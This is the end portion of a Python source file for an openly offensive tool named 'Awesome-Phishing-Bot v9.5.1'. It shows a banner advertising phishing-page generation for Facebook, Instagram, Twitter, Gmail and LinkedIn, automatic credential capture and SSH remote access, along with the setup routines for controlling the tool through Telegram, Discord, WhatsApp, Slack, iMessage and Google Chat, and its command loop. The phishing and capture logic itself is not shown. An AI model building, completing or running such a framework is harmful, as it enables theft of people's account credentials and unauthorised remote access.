        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.imessage = IMessageBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.GREEN1}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.GREEN2}        🌿 AWESOME-PHISHING-BOT v9.5.1   🌿                                {Colors.GREEN1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN3}  • 🎣 Advanced Phishing Framework          • Facebook/Instagram/Twitter/Gmail {Colors.GREEN1}║
║{Colors.GREEN3}  • 🤖 Multi-Platform Bot Support          • Telegram/Discord/WhatsApp/Slack   {Colors.GREEN1}║
║{Colors.GREEN3}  • 🔐 SSH Remote Access                   • iMessage/Google Chat Integration  {Colors.GREEN1}║
║{Colors.GREEN3}  • 📊 Graphical Reports & Statistics      • QR Code & URL Shortening          {Colors.GREEN1}║
║{Colors.GREEN3}  • 🔍 Security Scanning                   • IP Analysis & Monitoring          {Colors.GREEN1}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN2}🌿 FEATURES:{Colors.RESET}
  • 🎣 Generate phishing pages for Facebook, Instagram, Twitter, Gmail, LinkedIn
  • 🤖 Control via Telegram, Discord, WhatsApp, Slack, iMessage, Google Chat
  • 🔐 SSH remote access through chat platforms
  • 📊 Automatic credential capture and reporting
  • 🔍 Security scanning and IP analysis

{Colors.GREEN1}💡 Type 'help' for commands{Colors.RESET}
{Colors.GREEN1}🎣 Type 'phish facebook' to generate a phishing link{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        print(f"\n{Colors.GREEN2}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.GREEN3}{'='*50}{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.YELLOW}Setup Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.YELLOW}Enter bot token (from @BotFather): {Colors.RESET}").strip()
            api_id = input(f"{Colors.YELLOW}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.YELLOW}Enter API Hash: {Colors.RESET}").strip()
            if self.telegram.save_config(token, api_id, api_hash):
                print(f"{Colors.GREEN2}✅ Telegram configured{Colors.RESET}")
                self.telegram.start_bot_thread()
        
        # Discord
        setup = input(f"{Colors.YELLOW}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.YELLOW}Enter bot token: {Colors.RESET}").strip()
            if self.discord.save_config(token):
                print(f"{Colors.GREEN2}✅ Discord configured{Colors.RESET}")
                self.discord.start_bot_thread()
        
        # WhatsApp
        setup = input(f"{Colors.YELLOW}Setup WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.YELLOW}Enter phone number: {Colors.RESET}").strip()
            if self.whatsapp.save_config(phone):
                print(f"{Colors.GREEN2}✅ WhatsApp configured{Colors.RESET}")
                self.whatsapp.start_bot_thread()
        
        # Slack
        setup = input(f"{Colors.YELLOW}Setup Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.YELLOW}Enter bot token: {Colors.RESET}").strip()
            if self.slack.save_config(token):
                print(f"{Colors.GREEN2}✅ Slack configured{Colors.RESET}")
                self.slack.start_bot_thread()
        
        # iMessage (macOS only)
        if platform.system().lower() == 'darwin':
            setup = input(f"{Colors.YELLOW}Setup iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                if self.imessage.save_config():
                    print(f"{Colors.GREEN2}✅ iMessage configured{Colors.RESET}")
                    self.imessage.start_bot_thread()
        
        # Google Chat
        setup = input(f"{Colors.YELLOW}Setup Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.YELLOW}Enter webhook URL: {Colors.RESET}").strip()
            if self.google_chat.save_config(webhook):
                print(f"{Colors.GREEN2}✅ Google Chat configured{Colors.RESET}")
                self.google_chat.start_bot_thread()
    
    def authorize_telegram_user(self):
        print(f"\n{Colors.GREEN2}🔐 Authorize Telegram Users{Colors.RESET}")
        print(f"{Colors.GREEN3}{'='*50}{Colors.RESET}")
        print("To authorize a user, they must send any message to your bot first.")
        print("Then enter their user ID below.")
        
        user_id = input(f"{Colors.YELLOW}Enter Telegram user ID (or press Enter to skip): {Colors.RESET}").strip()
        if user_id:
            if self.db.authorize_user('telegram', user_id):
                print(f"{Colors.GREEN2}✅ User {user_id} authorized{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to authorize{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check dependencies
        print(f"\n{Colors.GREEN2}🔍 Checking dependencies...{Colors.RESET}")
        for lib, name in [(DISCORD_AVAILABLE, 'discord.py'), (TELETHON_AVAILABLE, 'telethon'),
                         (SLACK_AVAILABLE, 'slack-sdk'), (PARAMIKO_AVAILABLE, 'paramiko'),
                         (QRCODE_AVAILABLE, 'qrcode'), (SHORTENER_AVAILABLE, 'pyshorteners')]:
            status = f"{Colors.GREEN1}✅" if lib else f"{Colors.RED}❌"
            print(f"  {status} {name}{Colors.RESET}")
        
        self.setup_bots()
        self.authorize_telegram_user()
        
        print(f"\n{Colors.GREEN2}✅ Bot ready!{Colors.RESET}")
        print(f"{Colors.GREEN1}🎣 Try: phish facebook{Colors.RESET}")
        print(f"{Colors.GREEN1}🚀 Then: start_server <link_id>{Colors.RESET}")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.GREEN1}[{Colors.GREEN2}awesome-bot{Colors.GREEN1}]{Colors.RESET} "
                command = input(prompt).strip()
                
                if command == 'exit' or command == 'quit':
                    self.running = False
                    print(f"{Colors.GREEN1}👋 Goodbye!{Colors.RESET}")
                else:
                    result = self.handler.execute(command)
                    print(result['output'])
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN1}👋 Goodbye!{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        
        # Cleanup
        self.social.stop_phishing_server()
        self.whatsapp.stop()
        self.db.close()
        print(f"{Colors.GREEN2}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.GREEN1}🌿 Starting Awesome-Phishing-Bot v9.5.1...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = AwesomeBot()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN1}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()